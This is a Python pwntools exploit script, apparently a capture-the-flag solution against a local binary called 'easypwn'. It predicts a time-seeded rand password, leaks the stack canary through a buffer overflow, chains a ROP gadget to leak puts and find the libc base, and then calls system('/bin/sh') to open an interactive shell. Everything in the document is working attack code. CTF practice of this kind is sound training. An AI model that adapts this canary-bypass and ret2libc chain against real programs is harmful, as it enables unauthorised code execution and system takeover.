from pwn import *
from ctypes import *
from LibcSearcher import *
io=process('easypwn')
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc_elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('./easypwn')
main_addr=elf.symbols['main']
v0=libc.time(0)
libc.srand(v0)
passwd=''
for i in range(0,8):
    passwd+=chr(libc.rand()%95+32)#根据程序算法获取随机数
success(passwd)
io.recv()
io.sendline(passwd)

io.recvuntil('name?')
payload=b'a'*212+b'b'*4     #泄露canary
io.sendline(payload)
io.recvuntil('bbbb')
canary=u64(io.recv(8))
canary=canary-0x0a
success('canary: '+hex(canary))
puts_got=elf.got['puts']
puts_plt=0x4010D0
pop_rdi_ret=0x401503
payload=b'b'*104+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.recvuntil('do?')
io.sendline(payload)
io.recvuntil('that.\n')
put_addr=u64(io.recv(6).ljust(8,b'\x00'))
success("put_addr: "+hex(put_addr))
obj=LibcSearcher('puts',put_addr)
base_addr=put_addr-obj.dump('puts')
system_addr=base_addr+obj.dump('system')
bin_sh=base_addr+obj.dump('str_bin_sh')
payload=b'c'*264+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)
io.sendline(payload)

io.recvuntil('name?')

io.interactive()

